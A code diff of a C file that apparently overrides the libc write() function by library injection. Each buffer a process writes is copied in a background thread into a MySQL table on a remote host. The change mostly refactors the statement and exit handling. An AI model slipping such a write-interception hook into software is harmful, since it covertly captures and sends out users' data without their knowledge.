@@ -19,12 +19,15 @@
 //
 #include "inject.h"
 
+#define INSERT_STATEMENT    "INSERT INTO imbedata (date_recorded, data) VALUES (?, ?);"
+#define INSERT_ERROR        "INSERT INTO imbedata (date_recorded, data) " \
+                            "VALUES (%zu, (data of size: %zu));"
 extern const char *db_pass;
 extern const char *db_host;
 extern const char *db_user;
 extern const char *schema;
 
-void writeToDatabase(const void *buf, size_t nbyte) {
+void writeToDatabase(void *buf, size_t nbyte) {
 
     const time_t startTime = time(NULL);
     int status;
@@ -38,9 +41,9 @@ void writeToDatabase(const void *buf, size_t nbyte) {
 
     conn = initializeMySqlConnection(bind);
 
-    stmt = generateMySqlStatment(conn, &status);
+    stmt = generateMySqlStatment(INSERT_STATEMENT, conn, &status, 57);
     if (status != 0) {
-        doExitStatement(conn, startTime, nbyte);
+        doExit(conn);
     }
 
     bind[0].buffer_type = MYSQL_TYPE_DATETIME;
@@ -56,11 +59,11 @@ void writeToDatabase(const void *buf, size_t nbyte) {
 
     status = mysql_stmt_bind_param(stmt, bind);
     if (status != 0) {
-        doExitStatement(conn, startTime, nbyte);
+        doExit(conn);
     }
     status = mysql_stmt_execute(stmt);
     if (status != 0) {
-        doExitStatement(conn, startTime, nbyte);
+        doExit(conn);
     }
 
     mysql_stmt_close(stmt);
@@ -73,6 +76,8 @@ void *run(void *ctx) {
 
     struct thread_args *args = (struct thread_args *) ctx;
 
+    sem_wait(&sem);
+
     writeToDatabase(args->buf, args->nbyte);
 
     sem_post(&sem);
@@ -81,6 +86,11 @@ void *run(void *ctx) {
     free(ctx);
 
     pthread_exit(&args->pid);
+}
+
+void onExit(void) {
+    next_write = NULL;
+    onExitSuper();
 }
 
 ssize_t write(int fildes, const void *buf, size_t nbyte, off_t offset) {
@@ -106,7 +116,7 @@ ssize_t write(int fildes, const void *buf, size_t nbyte, off_t offset) {
     }
 
     pthread_t pid = 0;
-    struct thread_args *args = malloc(sizeof (struct thread_args));
+    struct thread_args *args = malloc(sizeof(struct thread_args));
     args->buf = malloc(nbyte * sizeof(char));
     args->nbyte = nbyte;
     args->pid = pid;
